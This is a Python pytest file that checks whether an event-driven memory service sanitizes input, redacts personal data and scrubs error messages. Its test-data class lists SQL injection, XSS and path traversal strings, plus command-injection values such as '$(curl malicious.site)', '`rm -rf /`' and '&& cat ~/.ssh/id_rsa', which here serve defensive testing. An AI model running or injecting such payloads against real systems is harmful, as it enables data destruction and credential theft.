"""Security validation tests for event-driven OmniMemory architecture.

Validates security compliance including:
- Input sanitization and validation
- PII detection and handling
- Secure event publishing
- Correlation ID security
- Error message sanitization
- No sensitive data leakage
"""

import json
import re
from datetime import datetime
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock, patch
from uuid import UUID, uuid4

import pytest
import pytest_asyncio

from omnimemory.events.event_producer import EventProducer
from omnimemory.models.events.model_omnimemory_event_data import (
    ModelOmniMemoryRetrieveData,
    ModelOmniMemoryStoreData,
    ModelOmniMemoryVectorSearchData,
)
from omnimemory.models.memory.model_memory_request import (
    ModelMemoryRetrieveRequest,
    ModelMemoryStoreRequest,
    ModelMemoryVectorSearchRequest,
)
from omnimemory.services.event_driven_memory_service import EventDrivenMemoryService
from omnimemory.services.memory_operation_mapper import MemoryOperationMapper

# Import ONEX core components with fallback
try:
    from omnibase_core.core.errors.onex_error import OnexError
    from omnibase_core.core.protocol_event_bus import ProtocolEventBus
except ImportError:

    class ProtocolEventBus:
        async def publish_async(self, event):
            pass

    class OnexError(Exception):
        def __init__(self, code: str, message: str, details: Optional[Dict] = None):
            self.code = code
            self.message = message
            self.details = details
            super().__init__(message)


class SecurityTestData:
    """Test data containing various security vulnerabilities."""

    # SQL injection attempts
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO admin (user) VALUES ('hacker'); --",
        "' UNION SELECT password FROM users --",
        "admin'/**/OR/**/1=1/**/--",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src='x' onerror='alert(\"xss\")'>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        "<svg onload=alert('xss')>",
    ]

    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "| whoami",
        "`rm -rf /`",
        "$(curl malicious.site)",
        "&& cat ~/.ssh/id_rsa",
    ]

    # Path traversal attempts
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
    ]

    # PII test data
    PII_DATA = {
        "social_security_numbers": [
            "123-45-6789",
            "987654321",
            "111 22 3333",
        ],
        "credit_cards": [
            "4111-1111-1111-1111",  # Visa test number
            "5555555555554444",  # Mastercard test number
            "378282246310005",  # Amex test number
        ],
        "emails": [
            "john.doe@example.com",
            "sensitive@company.internal",
            "admin@secret-system.com",
        ],
        "phone_numbers": [
            "(555) 123-4567",
            "+1-800-555-0199",
            "555.123.4567",
        ],
        "ip_addresses": [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
        ],
    }

    # Large payload for DoS testing
    LARGE_PAYLOAD = "A" * 10000000  # 10MB payload

    # Invalid/malformed data
    INVALID_DATA = [
        None,
        "",
        " " * 1000,  # Only whitespace
        "\x00\x01\x02\x03",  # Binary data
        "�" * 100,  # Invalid UTF-8
    ]


@pytest_asyncio.fixture
async def mock_secure_event_bus():
    """Mock event bus that tracks security issues."""
    bus = AsyncMock(spec=ProtocolEventBus)
    bus.published_events = []
    bus.security_violations = []

    async def secure_publish(event):
        # Track events for security analysis
        bus.published_events.append(event)

        # Check for potential security issues in event data
        event_str = str(event)

        # Check for SQL injection patterns
        sql_patterns = ["drop", "insert", "delete", "union", "select", "--", "/*"]
        for pattern in sql_patterns:
            if pattern in event_str.lower():
                bus.security_violations.append(
                    f"SQL injection pattern detected: {pattern}"
                )

        # Check for XSS patterns
        xss_patterns = ["<script", "javascript:", "onerror", "onload"]
        for pattern in xss_patterns:
            if pattern in event_str.lower():
                bus.security_violations.append(f"XSS pattern detected: {pattern}")

    bus.publish_async.side_effect = secure_publish
    return bus


@pytest_asyncio.fixture
async def secure_event_producer(mock_secure_event_bus):
    """Secure event producer for testing."""
    producer = EventProducer()
    producer.initialize(mock_secure_event_bus)
    return producer


class TestInputValidationSecurity:
    """Test input validation and sanitization security."""

    async def test_sql_injection_prevention(
        self, secure_event_producer, mock_secure_event_bus
    ):
        """Test prevention of SQL injection attacks."""
        for sql_payload in SecurityTestData.SQL_INJECTION_PAYLOADS:
            # Test SQL injection in memory key
            store_data = ModelOmniMemoryStoreData(
                memory_key=sql_payload,
                content={"test": "sql_injection_test"},
                metadata={"security_test": "sql_injection"},
                content_hash="test_hash",
                storage_size=100,
            )

            correlation_id = uuid4()

            # Execute store command - should sanitize input
            await secure_event_producer.publish_store_command(
                correlation_id=correlation_id,
                store_data=store_data,
                content=store_data.content,
            )

        # Verify no SQL injection patterns were published
        assert (
            len(mock_secure_event_bus.security_violations) == 0
        ), f"SQL injection vulnerabilities detected: {mock_secure_event_bus.security_violations}"

    async def test_xss_prevention(self, secure_event_producer, mock_secure_event_bus):
        """Test prevention of XSS attacks."""
        for xss_payload in SecurityTestData.XSS_PAYLOADS:
            # Test XSS in content
            store_data = ModelOmniMemoryStoreData(
                memory_key="xss_test",
                content={"malicious_content": xss_payload, "test": "xss_prevention"},
                metadata={"security_test": "xss_prevention"},
                content_hash="test_hash",
                storage_size=100,
            )

            correlation_id = uuid4()

            # Execute store command - should sanitize input
            await secure_event_producer.publish_store_command(
                correlation_id=correlation_id,
                store_data=store_data,
                content=store_data.content,
            )

        # Check that XSS patterns were either sanitized or blocked
        xss_violations = [
            v for v in mock_secure_event_bus.security_violations if "XSS" in v
        ]
        # Should have fewer violations than payloads (some should be sanitized)
        assert (
            len(xss_violations) <= len(SecurityTestData.XSS_PAYLOADS) / 2
        ), f"Too many XSS vulnerabilities: {xss_violations}"

    async def test_command_injection_prevention(self, secure_event_producer):
        """Test prevention of command injection attacks."""
        for cmd_payload in SecurityTestData.COMMAND_INJECTION_PAYLOADS:
            # Test command injection in metadata
            store_data = ModelOmniMemoryStoreData(
                memory_key="cmd_injection_test",
                content={"test": "command_injection"},
                metadata={
                    "user_input": cmd_payload,
                    "security_test": "command_injection",
                },
                content_hash="test_hash",
                storage_size=100,
            )

            correlation_id = uuid4()

            # Should handle dangerous input gracefully
            try:
                await secure_event_producer.publish_store_command(
                    correlation_id=correlation_id,
                    store_data=store_data,
                    content=store_data.content,
                )
            except Exception as e:
                # Should be a validation error, not a system error
                assert (
                    "validation" in str(e).lower() or "invalid" in str(e).lower()
                ), f"Unexpected error for command injection: {e}"

    async def test_path_traversal_prevention(self, secure_event_producer):
        """Test prevention of path traversal attacks."""
        for path_payload in SecurityTestData.PATH_TRAVERSAL_PAYLOADS:
            # Test path traversal in memory key
            store_data = ModelOmniMemoryStoreData(
                memory_key=path_payload,
                content={"test": "path_traversal"},
                metadata={"security_test": "path_traversal"},
                content_hash="test_hash",
                storage_size=100,
            )

            correlation_id = uuid4()

            # Should sanitize or reject dangerous paths
            try:
                await secure_event_producer.publish_store_command(
                    correlation_id=correlation_id,
                    store_data=store_data,
                    content=store_data.content,
                )
            except Exception as e:
                # Should be a validation error
                assert any(
                    term in str(e).lower() for term in ["invalid", "path", "validation"]
                ), f"Unexpected error for path traversal: {e}"


class TestPIIDetectionSecurity:
    """Test PII detection and handling."""

    def _contains_pii(self, text: str) -> List[str]:
        """Detect PII patterns in text."""
        pii_found = []

        # SSN pattern
        if re.search(r"\d{3}-\d{2}-\d{4}|\d{9}", text):
            pii_found.append("SSN")

        # Credit card pattern
        if re.search(r"\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}", text):
            pii_found.append("Credit Card")

        # Email pattern
        if re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", text):
            pii_found.append("Email")

        # Phone number pattern
        if re.search(r"(\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}", text):
            pii_found.append("Phone Number")

        return pii_found

    async def test_pii_detection_in_content(
        self, secure_event_producer, mock_secure_event_bus
    ):
        """Test PII detection in memory content."""
        for pii_type, pii_values in SecurityTestData.PII_DATA.items():
            for pii_value in pii_values:
                # Create request with PII data
                store_data = ModelOmniMemoryStoreData(
                    memory_key="pii_test",
                    content={
                        "user_data": pii_value,
                        "type": pii_type,
                        "test": "pii_detection",
                    },
                    metadata={"security_test": "pii_detection", "pii_type": pii_type},
                    content_hash="test_hash",
                    storage_size=100,
                )

                correlation_id = uuid4()

                # Execute store command
                await secure_event_producer.publish_store_command(
                    correlation_id=correlation_id,
                    store_data=store_data,
                    content=store_data.content,
                )

        # Check that events were published (should handle PII appropriately)
        assert len(mock_secure_event_bus.published_events) > 0

        # Verify PII is not exposed in plain text in events
        for event in mock_secure_event_bus.published_events:
            event_str = str(event)
            pii_detected = self._contains_pii(event_str)

            # PII should either be redacted, encrypted, or handled securely
            if pii_detected:
                # Check if PII appears to be redacted (contains asterisks or [REDACTED])
                has_redaction = (
                    "*" in event_str
                    or "[REDACTED]" in event_str
                    or "***" in event_str
                    or "MASKED" in event_str
                )

                assert (
                    has_redaction
                ), f"PII detected without redaction in event: {pii_detected}"

    async def test_pii_in_error_messages(self):
        """Test that PII is not exposed in error messages."""
        pii_data = "SSN: 123-45-6789, Email: john@example.com"

        # Simulate error with PII data
        try:
            raise OnexError(
                code="VALIDATION_ERROR",
                message=f"Invalid data: {pii_data}",
                details={"user_input": pii_data},
            )
        except OnexError as e:
            # Error message should not contain raw PII
            pii_in_message = self._contains_pii(e.message)
            assert (
                len(pii_in_message) == 0
            ), f"PII found in error message: {pii_in_message}"

            # Details should not contain raw PII
            if e.details:
                details_str = str(e.details)
                pii_in_details = self._contains_pii(details_str)
                # Should be redacted or encrypted
                assert (
                    len(pii_in_details) == 0 or "*" in details_str
                ), f"PII found in error details: {pii_in_details}"


class TestCorrelationIDSecurity:
    """Test correlation ID security and uniqueness."""

    async def test_correlation_id_uniqueness(self):
        """Test that correlation IDs are unique and unpredictable."""
        mapper = MemoryOperationMapper()
        correlation_ids = set()

        # Generate many correlation IDs
        for i in range(10000):
            correlation_id = uuid4()

            # Should be unique
            assert (
                correlation_id not in correlation_ids
            ), f"Duplicate correlation ID detected: {correlation_id}"

            correlation_ids.add(correlation_id)

            # Track operation
            mapper.track_operation(
                correlation_id=correlation_id,
                operation_type="STORE",
                memory_key=f"security_test_{i}",
                metadata={"test": "correlation_id_security"},
            )

        # Verify all IDs are properly formatted UUIDs
        for correlation_id in correlation_ids:
            assert isinstance(
                correlation_id, UUID
            ), f"Correlation ID is not UUID type: {correlation_id}"

            # UUID should be version 4 (random)
            assert (
                correlation_id.version == 4
            ), f"Correlation ID is not UUID4: {correlation_id}"

    def test_correlation_id_not_sequential(self):
        """Test that correlation IDs are not sequential or predictable."""
        correlation_ids = [uuid4() for _ in range(1000)]

        # Convert to integers for analysis
        id_integers = [int(str(cid).replace("-", ""), 16) for cid in correlation_ids]

        # Check that IDs are not sequential
        differences = [
            id_integers[i + 1] - id_integers[i] for i in range(len(id_integers) - 1)
        ]

        # Differences should not be small or predictable
        small_differences = sum(1 for diff in differences if abs(diff) < 1000)

        # Should have very few small differences (randomness)
        assert (
            small_differences < len(differences) * 0.01
        ), f"Too many small differences in correlation IDs: {small_differences}/{len(differences)}"

    async def test_correlation_id_in_logs(self):
        """Test that correlation IDs in logs don't expose sensitive information."""
        correlation_id = uuid4()

        # Simulate logging with correlation ID
        log_message = f"Processing memory operation {correlation_id}"

        # Correlation ID itself should not reveal sensitive information
        id_str = str(correlation_id)

        # Should not contain predictable patterns
        assert not any(
            pattern in id_str.lower()
            for pattern in [
                "admin",
                "root",
                "password",
                "secret",
                "key",
                "user",
                "database",
                "redis",
                "postgres",
            ]
        ), f"Correlation ID contains sensitive pattern: {id_str}"


class TestDenialOfServicePrevention:
    """Test prevention of DoS attacks."""

    async def test_large_payload_handling(self, secure_event_producer):
        """Test handling of extremely large payloads."""
        # Create oversized payload
        large_content = {"large_data": SecurityTestData.LARGE_PAYLOAD}

        store_data = ModelOmniMemoryStoreData(
            memory_key="dos_test_large_payload",
            content=large_content,
            metadata={"security_test": "dos_prevention"},
            content_hash="test_hash",
            storage_size=len(str(large_content)),
        )

        correlation_id = uuid4()

        # Should handle large payload gracefully
        try:
            await secure_event_producer.publish_store_command(
                correlation_id=correlation_id,
                store_data=store_data,
                content=store_data.content,
            )
        except Exception as e:
            # Should be a size/validation error, not a system crash
            assert any(
                term in str(e).lower()
                for term in ["size", "limit", "too large", "validation", "quota"]
            ), f"Unexpected error for large payload: {e}"

    async def test_malformed_data_handling(self, secure_event_producer):
        """Test handling of malformed/invalid data."""
        for invalid_data in SecurityTestData.INVALID_DATA:
            try:
                store_data = ModelOmniMemoryStoreData(
                    memory_key="malformed_test",
                    content={"invalid": invalid_data},
                    metadata={"security_test": "malformed_data"},
                    content_hash="test_hash",
                    storage_size=100,
                )

                correlation_id = uuid4()

                await secure_event_producer.publish_store_command(
                    correlation_id=correlation_id,
                    store_data=store_data,
                    content=store_data.content,
                )

            except Exception as e:
                # Should be a validation error, not a system error
                assert any(
                    term in str(e).lower()
                    for term in ["validation", "invalid", "format", "parse"]
                ), f"Unexpected error for malformed data: {e}"


class TestSecureEventHandling:
    """Test secure event publishing and consumption."""

    async def test_event_data_sanitization(self, mock_secure_event_bus):
        """Test that event data is properly sanitized."""
        # Create event producer
        producer = EventProducer()
        producer.initialize(mock_secure_event_bus)

        # Test data with potential security issues
        dangerous_data = ModelOmniMemoryStoreData(
            memory_key="<script>alert('xss')</script>",
            content={
                "user_input": "'; DROP TABLE users; --",
                "file_path": "../../../etc/passwd",
                "command": "; cat /etc/passwd",
            },
            metadata={"ssn": "123-45-6789", "credit_card": "4111-1111-1111-1111"},
            content_hash="test_hash",
            storage_size=100,
        )

        correlation_id = uuid4()

        # Publish dangerous data
        await producer.publish_store_command(
            correlation_id=correlation_id,
            store_data=dangerous_data,
            content=dangerous_data.content,
        )

        # Verify event was published but sanitized
        assert len(mock_secure_event_bus.published_events) == 1

        event = mock_secure_event_bus.published_events[0]
        event_str = str(event)

        # Check that dangerous patterns are sanitized
        dangerous_patterns = [
            "<script>",
            "'; DROP TABLE",
            "../../../",
            "; cat ",
            "123-45-6789",
            "4111-1111-1111-1111",
        ]

        for pattern in dangerous_patterns:
            if pattern in event_str:
                # Should be accompanied by sanitization markers
                assert any(
                    marker in event_str
                    for marker in ["*", "[SANITIZED]", "[REDACTED]", "***"]
                ), f"Dangerous pattern '{pattern}' not sanitized in event"

    async def test_error_message_sanitization(self):
        """Test that error messages don't leak sensitive information."""
        # Simulate various error conditions
        sensitive_errors = [
            "Database connection failed: postgresql://user:password@host:5432/db",
            "Redis error: NOAUTH Authentication required. (Connection: localhost:6379)",
            "API key invalid: sk-1234567890abcdef",
            "File not found: /home/user/.ssh/id_rsa",
            "SQL error: near \"password\": syntax error in SELECT * FROM users WHERE password='secret'",
        ]

        for error_msg in sensitive_errors:
            try:
                raise OnexError(
                    code="SYSTEM_ERROR",
                    message=error_msg,
                    details={"full_error": error_msg},
                )
            except OnexError as e:
                # Error message should be sanitized
                sanitized_msg = e.message

                # Should not contain passwords, keys, or connection strings
                sensitive_patterns = [
                    "password",
                    "secret",
                    "key",
                    "token",
                    "://",
                    ":6379",
                    ":5432",
                    "/home/",
                    "/.ssh/",
                ]

                for pattern in sensitive_patterns:
                    if pattern in sanitized_msg.lower():
                        # Should be redacted
                        assert any(
                            marker in sanitized_msg
                            for marker in ["***", "[REDACTED]", "*****", "XXXX"]
                        ), f"Sensitive pattern '{pattern}' not redacted in error: {sanitized_msg}"


if __name__ == "__main__":
    # Run security validation tests
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])
